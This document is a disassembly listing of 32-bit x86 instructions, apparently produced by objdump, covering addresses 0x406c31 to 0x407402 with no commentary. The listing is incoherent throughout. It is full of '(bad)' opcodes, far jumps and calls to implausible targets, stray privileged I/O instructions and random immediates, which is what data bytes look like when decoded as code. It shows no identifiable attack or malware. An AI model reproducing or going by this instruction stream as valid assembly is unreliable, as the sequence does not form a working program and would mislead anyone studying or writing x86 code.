  406c31:	pop    ebp
  406c32:	mov    bh,0x5b
  406c34:	mov    al,ds:0xfffc8201
  406c39:	pop    ecx
  406c3a:	or     eax,0x6fac978f
  406c3f:	lods   al,BYTE PTR ds:[esi]
  406c40:	nop
  406c41:	imul   edx,ecx,0xffffffb5
  406c44:	sub    eax,0x16693f87
  406c49:	xor    al,0xa1
  406c4b:	(bad)  
  406c4d:	daa    
  406c4e:	test   DWORD PTR [eax],edi
  406c50:	ret    
  406c51:	sub    eax,0x8713e878
  406c56:	sub    ch,bl
  406c58:	sub    ch,BYTE PTR [esp+ecx*4-0x6b4ff370]
  406c5f:	call   0xe5d4:0x9ab3a3f
  406c66:	push   0x111d9076
  406c6b:	sub    al,0x3f
  406c6d:	add    BYTE PTR [esi],bh
  406c6f:	icebp  
  406c70:	(bad)
  406c75:	xor    esi,DWORD PTR ds:0x5f791c9d
  406c7b:	mov    ecx,0xebb5979
  406c81:	mov    esp,0xa96ca6b4
  406c87:	push   ebp
  406c88:	popa   
  406c89:	xor    al,0xa1
  406c8b:	adc    bh,BYTE PTR [ebp+0x32]
  406c8e:	mov    edx,0x84ff200f
  406c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c94:	cli    
  406c95:	and    BYTE PTR [eax-0x87125b0],dh
  406c9b:	add    ebx,ecx
  406c9d:	inc    ebp
  406c9e:	push   ecx
  406c9f:	stc    
  406ca0:	call   0x889f:0x587803c1
  406ca7:	mov    bh,0x4c
  406ca9:	outs   dx,BYTE PTR ds:[esi]
  406caa:	jnp    0x406cf9
  406cac:	fnstenv [esi-0x70]
  406caf:	lock lods al,BYTE PTR ds:[esi]
  406cb1:	dec    ebp
  406cb2:	add    BYTE PTR [esi+0x381a87a6],bh
  406cb8:	faddp  st(6),st
  406cba:	int    0x6
  406cbc:	xor    BYTE PTR [edx+ecx*1+0x24],dl
  406cc0:	in     eax,0xb9
  406cc2:	(bad)  
  406cc3:	cmc    
  406cc4:	dec    edx
  406cc5:	les    ecx,FWORD PTR [ebp+0x74131953]
  406ccb:	jne    0x406d07
  406ccd:	add    bl,al
  406ccf:	rcr    esp,0x43
  406cd2:	or     BYTE PTR [ebx-0x2c99f2c3],ch
  406cd8:	sub    eax,0x49adcfd6
  406cdd:	xchg   al,ch
  406cdf:	int3   
  406ce0:	adc    edx,DWORD PTR [ebp+0x54ae7139]
  406ce6:	and    DWORD PTR [eax],ebx
  406ce8:	test   eax,0xdd4f875
  406ced:	xchg   edx,eax
  406cef:	das    
  406cf0:	mov    cl,0xbd
  406cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf3:	out    dx,al
  406cf4:	(bad)  
  406cf5:	in     al,0xb2
  406cf7:	dec    ebp
  406cf8:	mov    al,ds:0xb518cdcd
  406cfd:	cs ds mov eax,0x9132593
  406d04:	push   edi
  406d05:	xor    dl,0xa1
  406d08:	sub    eax,DWORD PTR [eax+edx*8+0x66953fd]
  406d0f:	push   eax
  406d10:	or     DWORD PTR [edx+0x5f],eax
  406d13:	mov    ebp,esi
  406d15:	sbb    al,0x1f
  406d17:	in     al,0x19
  406d19:	and    edx,DWORD PTR [ebp-0x34fc2bdc]
  406d1f:	scas   al,BYTE PTR es:[edi]
  406d20:	into   
  406d21:	mov    dh,0xe0
  406d23:	imul   esp,DWORD PTR [ebx-0x43f9361d],0xffffffad
  406d2a:	mov    al,0x84
  406d2c:	ins    BYTE PTR es:[edi],dx
  406d2d:	scas   eax,DWORD PTR es:[edi]
  406d2e:	pushf  
  406d2f:	xlat   BYTE PTR ds:[ebx]
  406d30:	mov    ecx,0xfce71f99
  406d35:	inc    edi
  406d36:	out    dx,al
  406d37:	bound  esi,QWORD PTR [edi+0xd]
  406d3a:	push   esi
  406d3b:	xchg   esp,eax
  406d3c:	xor    al,0xea
  406d3e:	jnp    0x406d77
  406d40:	repnz scas eax,DWORD PTR es:[edi]
  406d42:	outs   dx,BYTE PTR ds:[esi]
  406d43:	jl     0x406d15
  406d45:	mov    cs,WORD PTR [edx-0x2d]
  406d48:	xor    BYTE PTR [ebx+0x7217e598],0xea
  406d4f:	cmc    
  406d50:	dec    ebp
  406d51:	lds    esp,FWORD PTR [ebx+ebx*4+0x2c]
  406d55:	fcomp  DWORD PTR [edi-0x6536f3e8]
  406d5b:	cmp    dh,0xd0
  406d5e:	cwde   
  406d5f:	jg     0x406d45
  406d61:	test   al,0x9b
  406d63:	leave  
  406d64:	test   BYTE PTR [bp+di+0x77],0x83
  406d69:	out    dx,eax
  406d6a:	imul   esi,DWORD PTR [ecx-0x481afe1b],0xffffffc8
  406d71:	lods   al,BYTE PTR ds:[esi]
  406d72:	push   es
  406d73:	div    DWORD PTR [eax]
  406d75:	stc    
  406d76:	push   esp
  406d77:	inc    esp
  406d78:	pop    ebp
  406d79:	(bad)  
  406d7a:	sub    esp,esi
  406d7c:	(bad)  
  406d7d:	push   ebp
  406d7e:	cwde   
  406d7f:	cmp    ebp,ebp
  406d81:	or     al,0x26
  406d83:	cmc    
  406d84:	cmp    ecx,eax
  406d86:	or     BYTE PTR [ebx-0x3c],al
  406d89:	ret    
  406d8a:	mov    DWORD PTR [ebx],esp
  406d8c:	call   0x4f97:0xaada104e
  406d93:	aam    0xc3
  406d95:	stc    
  406d96:	pop    ecx
  406d97:	cs out 0xc0,eax
  406d9a:	dec    esp
  406d9b:	(bad)  
  406d9c:	lock sub eax,0xfe6c812d
  406da2:	xchg   edx,eax
  406da3:	add    DWORD PTR [ecx+eax*2],esi
  406da6:	in     eax,0xec
  406da8:	pop    esi
  406da9:	cmp    al,0x7f
  406dab:	push   ds
  406dac:	dec    esi
  406dad:	call   0x9a54830a
  406db2:	leave  
  406db3:	sub    BYTE PTR [ebp-0x3c9c460e],dh
  406db9:	pop    edi
  406dba:	add    al,BYTE PTR [ebp+eiz*8-0x4a5a3378]
  406dc1:	pusha  
  406dc2:	add    al,0x67
  406dc4:	jbe    0x406d7b
  406dc6:	bound  edx,QWORD PTR [ecx-0x7ad7b1bb]
  406dcc:	mov    al,0x6c
  406dce:	sub    al,0x1e
  406dd0:	ret    
  406dd1:	ret    
  406dd2:	popa   
  406dd3:	fwait
  406dd4:	mov    bl,0xe7
  406dd6:	xor    BYTE PTR [esi],al
  406dd8:	mov    dh,0xdd
  406dda:	data16 (bad) 
  406ddc:	in     al,dx
  406ddd:	js     0x406dfd
  406ddf:	pop    ebp
  406de0:	sbb    al,0x89
  406de2:	out    dx,al
  406de3:	jne    0x406e13
  406de5:	fstp   QWORD PTR [edi+0x3bb87216]
  406deb:	stc    
  406dec:	sub    DWORD PTR [ecx],ecx
  406dee:	in     al,0xed
  406df0:	inc    edi
  406df1:	xchg   esi,eax
  406df2:	ret    0xf5fc
  406df5:	arpl   WORD PTR [edi],dx
  406df7:	mov    bh,0xe8
  406df9:	stos   DWORD PTR es:[edi],eax
  406dfa:	mov    eax,0x45bd00d5
  406dff:	sub    ecx,DWORD PTR [eax+0x54]
  406e02:	add    BYTE PTR [eax+0xf70196d],al
  406e08:	add    edi,0xc
  406e0b:	sbb    bh,cl
  406e0d:	mov    edi,0xde14ad78
  406e12:	and    dh,BYTE PTR [ebp-0x36d5f09d]
  406e18:	dec    esp
  406e19:	inc    edi
  406e1a:	in     al,0x4b
  406e1c:	jp     0x406db3
  406e1e:	xor    al,0x91
  406e20:	ds jne 0x406e37
  406e23:	int3   
  406e24:	add    ebx,DWORD PTR [edi-0x7aeb836d]
  406e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e2b:	add    BYTE PTR [eax+ecx*1+0x78e3537e],dl
  406e32:	ret    0x40e9
  406e35:	cdq    
  406e36:	xor    al,BYTE PTR [edi+0x7425cec4]
  406e3c:	les    ebp,FWORD PTR [ecx-0x13]
  406e3f:	push   esi
  406e40:	adc    al,0x1b
  406e42:	cld    
  406e43:	in     al,0x35
  406e45:	sahf   
  406e46:	(bad)  
  406e47:	scas   eax,DWORD PTR es:[edi]
  406e48:	sub    al,0x3b
  406e4a:	sbb    al,0xd9
  406e4c:	das    
  406e4d:	not    BYTE PTR [eax+0x19]
  406e50:	loopne 0x406df0
  406e52:	lods   eax,DWORD PTR ds:[esi]
  406e53:	jp     0x406df1
  406e55:	pop    es
  406e56:	ds xchg ebx,eax
  406e58:	cwde   
  406e59:	add    ch,BYTE PTR [eax+0x45]
  406e5c:	popa   
  406e5d:	pop    esi
  406e5e:	je     0x406ed0
  406e60:	xor    ebx,DWORD PTR [edi+0x76]
  406e63:	(bad)
  406e67:	mov    ebx,0x6b95ebe6
  406e6c:	sub    BYTE PTR [ebx+0x62],ch
  406e6f:	(bad)  
  406e70:	cwde   
  406e71:	pop    ebp
  406e72:	js     0x406e21
  406e74:	sbb    BYTE PTR [edi+0x5f],dh
  406e77:	fmul   QWORD PTR [eax-0x2af36a29]
  406e7d:	and    al,0x6
  406e7f:	adc    esp,0x77
  406e82:	xchg   BYTE PTR [ecx+0x6b2bf5e6],al
  406e88:	outs   dx,BYTE PTR ds:[esi]
  406e89:	mov    eax,0xcf9c101
  406e8e:	sbb    al,0x46
  406e90:	jae    0x406e86
  406e92:	cmp    eax,0x831aea57
  406e97:	mov    al,ds:0xed8a76b9
  406e9c:	inc    eax
  406e9d:	dec    eax
  406e9e:	fst    DWORD PTR [edx+edi*1+0x2e840c28]
  406ea5:	add    DWORD PTR [edx],0x48
  406ea8:	scas   al,BYTE PTR es:[edi]
  406ea9:	and    BYTE PTR [ebp-0x63],0x6d
  406ead:	fcom   DWORD PTR ss:[ebx]
  406eb0:	xchg   edi,ebx
  406eb2:	retf   0xd6f
  406eb5:	push   cs
  406eb6:	adc    DWORD PTR [ebx-0x4783a0dd],edi
  406ebc:	inc    ecx
  406ebd:	or     dh,bl
  406ebf:	mov    cl,0x6d
  406ec1:	mov    al,ds:0x4352a63c
  406ec6:	fwait
  406ec7:	push   ss
  406ec8:	xor    ecx,DWORD PTR [ecx*2-0x500d130]
  406ecf:	dec    esi
  406ed0:	xor    cl,ah
  406ed2:	or     ch,BYTE PTR [ecx]
  406ed4:	pushf  
  406ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed6:	pop    ds
  406ed7:	or     eax,0xc88eca78
  406edc:	inc    eax
  406edd:	jnp    0x406eac
  406edf:	jge    0x406ed0
  406ee1:	and    edx,ebx
  406ee3:	(bad)
  406ee6:	nop
  406ee7:	sar    BYTE PTR [edx-0x5a],0xf5
  406eeb:	jmp    0x24193be1
  406ef0:	je     0x406f5b
  406ef2:	cdq    
  406ef3:	push   edi
  406ef4:	and    eax,0xd33404dd
  406ef9:	pushf  
  406efa:	cmp    ecx,edi
  406efc:	pop    ebp
  406efd:	add    eax,0x4bf045aa
  406f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f03:	jno    0x406ed4
  406f05:	shl    BYTE PTR [edi+0x74],0x6d
  406f09:	inc    esi
  406f0a:	push   cs
  406f0b:	cmp    ebp,DWORD PTR ds:0x8d2e6c1a
  406f11:	dec    eax
  406f12:	js     0x406eb5
  406f14:	sub    cl,dh
  406f16:	std    
  406f17:	xchg   ebx,eax
  406f18:	in     al,dx
  406f19:	(bad)  
  406f1a:	js     0x406f17
  406f1c:	mov    ebp,esp
  406f1e:	js     0x406f47
  406f20:	je     0x406f6c
  406f22:	mov    esi,0x690ee27f
  406f27:	pop    eax
  406f28:	mov    WORD PTR [ebx],ds
  406f2a:	push   esp
  406f2b:	sbb    eax,0x59cf8474
  406f30:	in     al,dx
  406f31:	sub    al,0xde
  406f33:	dec    ecx
  406f34:	loopne 0x406eb7
  406f36:	cmp    dh,0x72
  406f39:	lods   al,BYTE PTR ds:[esi]
  406f3a:	inc    ebx
  406f3b:	les    edx,FWORD PTR [esi-0x5049707f]
  406f41:	inc    edx
  406f42:	xchg   edx,eax
  406f43:	dec    esp
  406f44:	inc    edi
  406f45:	pop    ebp
  406f46:	xchg   edi,eax
  406f47:	(bad)  [ecx+0x755546d7]
  406f4d:	mov    dh,0x61
  406f4f:	xor    DWORD PTR [eax-0x138b0c72],esp
  406f55:	xchg   DWORD PTR [ecx+0x46f96d8e],eax
  406f5b:	pop    edx
  406f5c:	push   eax
  406f5d:	mov    bh,BYTE PTR [ebp-0x2d11c7a4]
  406f63:	lods   eax,DWORD PTR ds:[esi]
  406f64:	adc    ah,BYTE PTR [ebp-0x7355f262]
  406f6a:	sub    DWORD PTR [ecx-0x54b96787],ebx
  406f70:	enter  0x6cec,0xf8
  406f74:	icebp  
  406f75:	pop    edi
  406f76:	(bad)  
  406f78:	mov    BYTE PTR [esi],cl
  406f7a:	xchg   ebx,eax
  406f7b:	ret    0xe8ad
  406f7e:	in     eax,0xc2
  406f80:	push   eax
  406f81:	jo     0x406fdf
  406f83:	mov    ebx,0xffc4f4a0
  406f88:	faddp  st(7),st
  406f8a:	test   ebp,0xed76b966
  406f90:	mov    ah,bh
  406f92:	gs cli 
  406f94:	(bad)  
  406f95:	push   edi
  406f96:	mov    BYTE PTR [ebx+0xf],al
  406f99:	pop    esp
  406f9a:	pop    ecx
  406f9b:	out    0xd7,al
  406f9d:	mov    edi,0x6ed5f51a
  406fa2:	pop    eax
  406fa3:	sbb    BYTE PTR [eax+0x59],ch
  406fa6:	ins    DWORD PTR es:[edi],dx
  406fa7:	lock push ebx
  406fa9:	xchg   esi,eax
  406faa:	sbb    DWORD PTR [ecx+0x53],esi
  406fad:	sub    edi,DWORD PTR es:[edx]
  406fb0:	sahf   
  406fb1:	retf   0xcf8c
  406fb4:	inc    eax
  406fb5:	xchg   BYTE PTR [eax+0x6a54ae8b],al
  406fbb:	push   edi
  406fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fbd:	cs ins DWORD PTR es:[edi],dx
  406fbf:	lds    esp,FWORD PTR [edx]
  406fc1:	mov    dl,0x35
  406fc3:	mov    BYTE PTR [eax],bl
  406fc5:	cwde   
  406fc6:	int    0x90
  406fc8:	popa   
  406fc9:	fadd   DWORD PTR [edx]
  406fcb:	dec    eax
  406fcc:	aad    0x8a
  406fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fcf:	cli    
  406fd0:	loope  0x406f72
  406fd2:	(bad)  
  406fd3:	fild   QWORD PTR [eax-0xa]
  406fd6:	ins    DWORD PTR es:[edi],dx
  406fd7:	iret   
  406fd8:	addr16 daa 
  406fda:	cmp    esp,DWORD PTR [esi*1+0x669f1d6b]
  406fe1:	mov    al,ds:0x96311b7d
  406fe6:	sar    DWORD PTR [eax],1
  406fe8:	sbb    cl,BYTE PTR [ebp+0x28]
  406feb:	sub    bl,BYTE PTR [eax-0x1b0e33fe]
  406ff1:	add    DWORD PTR [ecx+ebp*8],ebp
  406ff4:	or     bl,BYTE PTR [edx+0x1e]
  406ff7:	xlat   BYTE PTR ds:[ebx]
  406ff8:	lahf   
  406ff9:	in     eax,dx
  406ffa:	and    al,0x31
  406ffc:	aad    0xfc
  406ffe:	xchg   edi,eax
  406fff:	in     al,dx
  407000:	sbb    dh,ah
  407002:	xchg   edi,eax
  407003:	mov    ebp,0x9d3be99c
  407008:	in     al,0xf1
  40700a:	mov    DWORD PTR [edi],edx
  40700c:	xchg   ch,ch
  40700e:	fcompp 
  407010:	dec    esi
  407011:	lahf   
  407012:	jle    0x406fa3
  407014:	mov    dh,0xb
  407016:	loopne 0x407096
  407018:	retf   
  407019:	test   eax,0x4ec87651
  40701e:	inc    edi
  40701f:	stos   BYTE PTR es:[edi],al
  407020:	fcomp  DWORD PTR [ebx]
  407022:	enter  0x7bbd,0xc4
  407026:	inc    ebp
  407027:	sbb    BYTE PTR [edx-0x4e64d930],0x6a
  40702e:	daa    
  40702f:	jmp    0x3efd:0x661823f0
  407036:	fistp  DWORD PTR [eax+0x5de1b3ea]
  40703c:	sbb    esi,DWORD PTR [ecx]
  40703e:	jmp    0x12c75846
  407043:	mov    al,ds:0xcba4757b
  407048:	cmp    eax,0x47d57a21
  40704d:	aad    0x5a
  40704f:	jge    0x4070a2
  407051:	add    bl,BYTE PTR [ebx-0x495c68ff]
  407057:	test   BYTE PTR [ebp+edi*2-0x20],ah
  40705b:	mov    al,ds:0x9e57857f
  407060:	push   ss
  407061:	jge    0x407078
  407063:	pop    ds
  407064:	xchg   ecx,eax
  407065:	adc    dl,BYTE PTR [edi-0x2da5747a]
  40706b:	and    al,0x84
  40706d:	sbb    esp,ebx
  40706f:	add    al,dl
  407071:	in     eax,0x44
  407073:	es lahf 
  407075:	sbb    ebp,esi
  407077:	push   cs
  407078:	jnp    0x40700b
  40707a:	rcl    DWORD PTR [ebp+0x72],0xb7
  40707e:	dec    edx
  40707f:	push   ebp
  407080:	and    al,0x2
  407082:	cmp    al,0x56
  407084:	in     eax,0xca
  407086:	(bad)  
  407087:	loop   0x407023
  407089:	mov    WORD PTR [esi-0x218c8753],ss
  40708f:	dec    edi
  407090:	jge    0x40704f
  407092:	call   0x8316:0xf481b19a
  407099:	cli    
  40709a:	mov    edi,0x659b7230
  40709f:	jle    0x407103
  4070a1:	mov    ch,0x45
  4070a3:	aaa    
  4070a4:	(bad)  
  4070a6:	(bad)  
  4070a7:	sub    ebx,DWORD PTR [edi]
  4070a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070aa:	in     al,dx
  4070ab:	mov    edi,0x5e1cb5c3
  4070b0:	repnz cs cld 
  4070b3:	mov    al,0x57
  4070b5:	into   
  4070b6:	call   0xbd14a6fd
  4070bb:	jmp    0x543a8348
  4070c0:	cmc    
  4070c1:	aaa    
  4070c2:	jmp    0x4070a9
  4070c4:	aaa    
  4070c5:	sub    ecx,DWORD PTR [ebx-0x67]
  4070c8:	push   esp
  4070c9:	sub    DWORD PTR [ebp+0x67],edi
  4070cc:	arpl   sp,dx
  4070ce:	xor    al,0x21
  4070d0:	loopne 0x407088
  4070d2:	mov    ch,0xf6
  4070d4:	xor    esp,DWORD PTR ds:[esi+0x48]
  4070d8:	js     0x4070a3
  4070da:	xlat   BYTE PTR ds:[ebx]
  4070db:	push   ss
  4070dc:	push   0x29b2ce80
  4070e1:	jae    0x407099
  4070e3:	mov    ah,BYTE PTR [eax]
  4070e5:	cmp    BYTE PTR [ebx+ebx*2],ah
  4070e8:	push   cs
  4070e9:	add    DWORD PTR [esi+0x72338451],edx
  4070ef:	(bad)  
  4070f0:	push   esi
  4070f1:	imul   edi,DWORD PTR [eax+0x4d4c8510],0x3
  4070f8:	pusha  
  4070f9:	sti    
  4070fa:	cmp    edi,DWORD PTR [ebx-0x79266680]
  407100:	xchg   edi,eax
  407101:	add    al,0xfb
  407103:	popa   
  407104:	jo     0x40712a
  407106:	push   edx
  407107:	inc    edx
  407108:	mov    ds:0x74b7959e,eax
  40710d:	jb     0x407113
  40710f:	sahf   
  407110:	inc    edx
  407111:	mov    ebx,0x7a9c16c2
  407116:	test   DWORD PTR [eax],ebp
  407118:	ja     0x40709f
  40711a:	mov    eax,ds:0xeb5b571c
  40711f:	mov    DWORD PTR [ecx+0x12],ebp
  407122:	ror    DWORD PTR [ebx-0x48bebad3],1
  407128:	ror    BYTE PTR [ecx+0x7bb0108d],cl
  40712e:	in     al,0x5
  407130:	ret    
  407131:	test   al,0xe7
  407133:	pop    ss
  407134:	cmp    esp,ebp
  407136:	jecxz  0x407114
  407138:	test   DWORD PTR [ecx],0xaab8894d
  40713e:	jb     0x407198
  407140:	or     BYTE PTR [ebx+0x4de9e7c2],0x88
  407147:	dec    eax
  407148:	push   edi
  407149:	sub    eax,0xb9f46021
  40714e:	mov    esp,0xdf55916a
  407153:	ins    BYTE PTR es:[edi],dx
  407154:	ret    
  407155:	dec    edx
  407156:	cmp    eax,0xc0c15c10
  40715b:	inc    ebp
  40715c:	cs and edi,esi
  40715f:	jne    0x4070e5
  407161:	das    
  407162:	pop    eax
  407163:	jle    0x40715d
  407165:	outs   dx,DWORD PTR ds:[esi]
  407166:	pop    ds
  407167:	lods   eax,DWORD PTR ds:[esi]
  407168:	add    ebp,DWORD PTR [edx-0x7f895930]
  40716e:	push   ebx
  40716f:	stos   DWORD PTR es:[edi],eax
  407170:	pop    edx
  407171:	xchg   ecx,eax
  407172:	pop    edx
  407173:	shr    ecx,cl
  407175:	xchg   edi,eax
  407176:	(bad)  
  407177:	mul    DWORD PTR [ebp+0x27]
  40717a:	imul   edx,DWORD PTR ds:0x228fa56,0xffffff89
  407181:	stos   BYTE PTR es:[edi],al
  407182:	add    al,BYTE PTR [edi]
  407184:	(bad)  
  407185:	push   ebp
  407186:	cmc    
  407187:	loope  0x4071ba
  407189:	xchg   DWORD PTR [edx+0x79],ebp
  40718c:	stos   BYTE PTR es:[edi],al
  40718d:	or     DWORD PTR [edi-0x1],eax
  407190:	call   0x137ce01e
  407195:	lds    esp,FWORD PTR [eax]
  407197:	pop    esp
  407198:	pop    ebp
  407199:	ficomp WORD PTR [eax+0x3a]
  40719c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40719d:	fsub   QWORD PTR [esi+ecx*1-0x28]
  4071a1:	test   DWORD PTR [esi],eax
  4071a3:	stos   BYTE PTR es:[edi],al
  4071a4:	and    edi,0x577a85f9
  4071aa:	repnz mov ebx,0x66ba2841
  4071b0:	dec    esi
  4071b1:	and    DWORD PTR [edx],ebx
  4071b3:	jne    0x40717d
  4071b5:	mov    DWORD PTR [esi],0xcae362c5
  4071bb:	xor    DWORD PTR [esi+ebx*2+0x23cff111],0xffffffec
  4071c3:	jmp    0x7903:0x39c7b1e2
  4071ca:	mov    eax,ds:0xd5226cf0
  4071cf:	mov    ch,BYTE PTR [ebp+0x28a36bf8]
  4071d5:	xor    eax,0xdf536ec9
  4071da:	add    esi,DWORD PTR [edi+0x31]
  4071dd:	adc    eax,0x94deeb98
  4071e2:	retfw  0xa9b3
  4071e6:	shl    BYTE PTR ds:0xe14b9c05,0xd0
  4071ed:	cmp    DWORD PTR [edi-0x736e1267],ebp
  4071f3:	test   al,0xf0
  4071f5:	sub    eax,0x4a8214e2
  4071fa:	and    cl,BYTE PTR [eax+0x7fcaeac1]
  407200:	lods   eax,DWORD PTR ds:[esi]
  407201:	faddp  st(2),st
  407203:	retf   0xd80f
  407206:	mov    eax,0x7ead5ab5
  40720b:	xor    DWORD PTR [edi+0x6d3a17c8],0xffffffba
  407212:	add    DWORD PTR [ebp+edx*2+0x12],ebx
  407216:	dec    edi
  407217:	mov    edx,0x87b7a60
  40721c:	fnsave [ecx]
  40721e:	dec    esp
  40721f:	in     al,dx
  407220:	sbb    ebx,DWORD PTR fs:[ebx]
  407223:	fistp  QWORD PTR [esi]
  407225:	popf   
  407226:	jge    0x4071b6
  407228:	(bad)  
  40722a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40722b:	mov    ebx,0xf2915efe
  407230:	xor    bl,BYTE PTR [esi+eax*4+0x26a60c39]
  407237:	and    eax,0x5755234e
  40723c:	scas   eax,DWORD PTR es:[edi]
  40723d:	inc    edx
  40723e:	add    al,0xfe
  407240:	dec    eax
  407241:	jp     0x407204
  407243:	ret    
  407244:	push   ss
  407245:	push   ebp
  407246:	jle    0x4071f0
  407248:	inc    esp
  407249:	dec    ecx
  40724a:	or     DWORD PTR [ebx],0xffffffd6
  40724d:	or     ah,BYTE PTR [ecx-0xf]
  407250:	test   ebx,esi
  407252:	xor    al,0x27
  407254:	sub    bh,BYTE PTR [ebp+0x6c]
  407257:	mov    ch,0xc8
  407259:	or     bh,BYTE PTR [ebx+eax*1+0x7b9f7f75]
  407260:	mov    ds,WORD PTR [edi]
  407262:	js     0x407254
  407264:	mov    edx,0x3dee29a4
  407269:	pop    esi
  40726a:	lea    eax,ds:0x20e53140
  407270:	pop    ebx
  407272:	inc    eax
  407273:	push   0xfffffff6
  407275:	mov    ch,bl
  407277:	lods   al,BYTE PTR ds:[esi]
  407278:	xchg   esi,eax
  407279:	iret   
  40727a:	mov    bh,0x19
  40727c:	add    al,0xde
  40727e:	xor    edi,ebx
  407280:	loopne 0x407261
  407282:	loopne 0x407254
  407284:	ja     0x4072bf
  407286:	cli    
  407287:	mov    esi,0xd5500f59
  40728c:	mov    cl,0xd2
  40728e:	xor    BYTE PTR [eax-0x7d03b01],0x6e
  407295:	loopne 0x4072b4
  407297:	mov    eax,0x8b1a0070
  40729c:	or     al,0x54
  40729e:	add    bl,BYTE PTR [esi]
  4072a0:	add    cl,bh
  4072a2:	arpl   WORD PTR [ebx-0x26594bf8],bp
  4072a8:	aaa    
  4072a9:	adc    ebx,esp
  4072ab:	xor    dl,BYTE PTR [eax+eax*1-0x72822509]
  4072b2:	adc    al,0xc
  4072b4:	retf   0xf4cc
  4072b7:	out    0xd5,eax
  4072b9:	push   ss
  4072ba:	dec    esi
  4072bb:	popa   
  4072bc:	xchg   ebp,eax
  4072bd:	mov    ebp,0x3be728db
  4072c2:	add    DWORD PTR ds:0x9fee9151,0x5c9ef540
  4072cc:	inc    ecx
  4072cd:	pop    esp
  4072ce:	std    
  4072cf:	ficomp DWORD PTR [ecx-0x69]
  4072d2:	retf   0x8abb
  4072d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072d6:	fldenv [esi+0x59]
  4072d9:	stos   BYTE PTR es:[edi],al
  4072da:	jns    0x407276
  4072dc:	and    al,0xe6
  4072de:	push   eax
  4072df:	add    DWORD PTR [edi],esi
  4072e1:	dec    ebx
  4072e2:	lock loope 0x407298
  4072e5:	(bad)  
  4072e6:	pop    ebx
  4072e7:	(bad)  
  4072e8:	push   edi
  4072e9:	mov    ah,0xc9
  4072eb:	data16 jns 0x40736a
  4072ee:	pop    edx
  4072ef:	icebp  
  4072f0:	push   ecx
  4072f1:	dec    ebx
  4072f2:	ret    
  4072f3:	lahf   
  4072f4:	jp     0x407292
  4072f6:	or     bl,ch
  4072f8:	mov    BYTE PTR [edi-0x1270d7f],0xdc
  4072ff:	adc    DWORD PTR [ecx-0x74b821c3],0x6c
  407306:	mov    ch,0x8c
  407308:	sbb    ecx,DWORD PTR [ebp+0x6]
  40730b:	mov    al,ds:0xc36b8f37
  407310:	jg     0x40731f
  407312:	ins    DWORD PTR es:[edi],dx
  407313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407314:	inc    esi
  407315:	cmp    eax,0xd2f0842e
  40731a:	xor    al,0x72
  40731c:	dec    edx
  40731d:	jae    0x407340
  40731f:	inc    edi
  407320:	arpl   di,ax
  407322:	sti    
  407323:	int3   
  407324:	mov    ah,0x75
  407326:	fadd   st,st(5)
  407328:	sub    BYTE PTR [eax+0xc],ch
  40732b:	div    BYTE PTR [ebx+0x50483ef2]
  407331:	mov    bh,0x8f
  407333:	sbb    eax,ebp
  407335:	push   0x5f0a112c
  40733a:	fnsave [edx-0x49125dfc]
  407340:	outs   dx,BYTE PTR ds:[esi]
  407341:	test   eax,0x2f492edd
  407346:	loopne 0x407366
  407348:	jmp    0xe0d9:0xa604a515
  40734f:	mov    edi,0xeb9d155f
  407354:	daa    
  407355:	add    dl,BYTE PTR [eax-0x28f9df41]
  40735b:	pop    ecx
  40735c:	add    al,0x36
  40735e:	test   al,0x3c
  407360:	cmp    al,0x78
  407362:	mov    edx,0xa3693feb
  407367:	(bad)  
  407368:	and    edx,0xffffff9c
  40736b:	fisubr DWORD PTR [edi+0x3526244d]
  407371:	cmp    al,0x54
  407373:	std    
  407374:	std    
  407375:	mov    bh,0x9f
  407377:	cli    
  407378:	jnp    0x407322
  40737a:	adc    DWORD PTR [ecx],ecx
  40737c:	xchg   ebp,eax
  40737d:	icebp  
  40737e:	(bad)  
  40737f:	cld    
  407380:	push   edx
  407381:	test   al,0xae
  407383:	ss sub eax,0x67396edd
  407389:	inc    ebx
  40738a:	pop    ebx
  40738b:	pop    eax
  40738c:	into   
  40738d:	stc    
  40738e:	pop    esp
  40738f:	int3   
  407390:	sbb    DWORD PTR [ecx],ebx
  407392:	fsubr  DWORD PTR [esi+0x62a25083]
  407398:	mov    dh,BYTE PTR [ecx+0x5ed0a061]
  40739e:	jno    0x40735f
  4073a0:	pusha  
  4073a1:	outs   dx,DWORD PTR ds:[esi]
  4073a2:	cmp    BYTE PTR [edx+eax*1],ah
  4073a5:	jl     0x407343
  4073a7:	pop    edi
  4073a8:	push   0x14d03617
  4073ad:	sub    edx,DWORD PTR [edx+0x1b]
  4073b0:	mov    BYTE PTR [edi+0x2371aa4d],bl
  4073b6:	int    0x68
  4073b8:	or     bh,BYTE PTR ds:[eax]
  4073bb:	mov    esi,0x5efbeae5
  4073c0:	mov    esi,0xe3c8d02f
  4073c5:	pop    eax
  4073c6:	xchg   cx,ax
  4073c8:	cs loop 0x407429
  4073cb:	jns    0x407447
  4073cd:	push   ecx
  4073ce:	mov    al,0x1b
  4073d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d1:	xchg   ebp,eax
  4073d2:	cwde   
  4073d3:	push   ss
  4073d4:	push   ebp
  4073d5:	mov    cl,0x69
  4073d7:	leave  
  4073d8:	mov    al,0x69
  4073da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073db:	jae    0x407374
  4073dd:	shl    BYTE PTR [eax-0x4b],cl
  4073e0:	pop    es
  4073e1:	daa    
  4073e2:	addr16 ret 0xaf2d
  4073e6:	pushf  
  4073e7:	mov    ecx,0x91383168
  4073ec:	test   eax,0xe4d38fe
  4073f1:	test   DWORD PTR [ebp+0x2cb78e0a],esi
  4073f7:	cmp    eax,0xfcec0ba9
  4073fc:	xchg   edx,eax
  4073fd:	pop    ebx
  4073fe:	push   edx
  4073ff:	xchg   DWORD PTR [ebx],ecx
  407401:	in     eax,dx
  407402:	enter  0x8e75,0x80
